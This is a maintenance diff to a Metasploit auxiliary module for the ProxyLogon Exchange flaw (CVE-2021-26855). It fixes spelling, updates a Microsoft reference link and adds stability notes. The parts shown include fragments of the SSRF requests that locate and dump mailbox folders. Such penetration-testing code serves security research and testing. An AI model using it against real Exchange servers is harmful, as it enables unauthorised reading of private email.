@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
           All components are vulnerable by default.
         },
         'Author' => [
-          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)
+          'Orange Tsai', # Discovery (Officially acknowledged by MSRC)
           'GreyOrder', # PoC (https://github.com/GreyOrder)
           'mekhalleh (RAMELLA Sébastien)' # Module author independent researcher (work at Zeop Entreprise)
         ],
@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2021-26855'],
           ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
           ['URL', 'https://proxylogon.com/'],
-          ['URL', 'https://aka.ms/exchangevulns'],
+          ['URL', 'https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/'],
           ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid'],
           ['URL', 'https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py']
         ],
@@ -60,7 +60,10 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'DefaultAction' => 'Dump (Emails)',
         'Notes' => {
-          'AKA' => ['ProxyLogon']
+          'AKA' => ['ProxyLogon'],
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
@@ -85,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
 
     response = send_xml('POST', ssrf, soap_countitems(action['id_attribute']))
     if response.body =~ /Success/
-      print_good("Successfuly connected to: #{action['id_attribute']}")
+      print_good("Successfully connected to: #{action['id_attribute']}")
       xml = Nokogiri::XML.parse(response.body)
 
       folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values&.at(0)
@@ -117,7 +120,7 @@ class MetasploitModule < Msf::Auxiliary
 
     response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER']))
     if response.body =~ /Success/
-      print_good("Successfuly connected to: #{datastore['FOLDER']}")
+      print_good("Successfully connected to: #{datastore['FOLDER']}")
       xml = Nokogiri::XML.parse(response.body)
 
       folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values&.at(0)
@@ -204,7 +207,7 @@ class MetasploitModule < Msf::Auxiliary
     xml = Nokogiri::XML.parse(response.body)
 
     legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content
-    fail_with(Failure::NotFound, 'No \'LegacyDN\' was found') if legacy_dn.empty?
+    fail_with(Failure::NotFound, 'No \'LegacyDN\' was found') if legacy_dn.blank?
 
     server = ''
     owa_urls = []
@@ -390,7 +393,7 @@ class MetasploitModule < Msf::Auxiliary
     server_name = response.headers['X-FEServer']
     print_status("Internal server name (#{server_name})")
 
-    # get informations by autodiscover request.
+    # get information by autodiscover request.
     print_status(message('Sending autodiscover request'))
     server_id, legacy_dn, owa_urls = request_autodiscover(server_name)
 
